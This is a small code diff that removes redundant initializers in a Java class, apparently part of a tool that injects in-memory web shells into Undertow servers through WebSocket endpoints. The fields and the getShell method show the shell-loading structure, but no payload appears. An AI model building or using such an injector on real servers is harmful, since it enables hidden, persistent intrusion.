@@ -21,7 +21,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class UndertowWebSocketInjector {
 
-    private static boolean ok = false;
+    private static boolean ok;
     private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
@@ -86,7 +86,7 @@ public class UndertowWebSocketInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
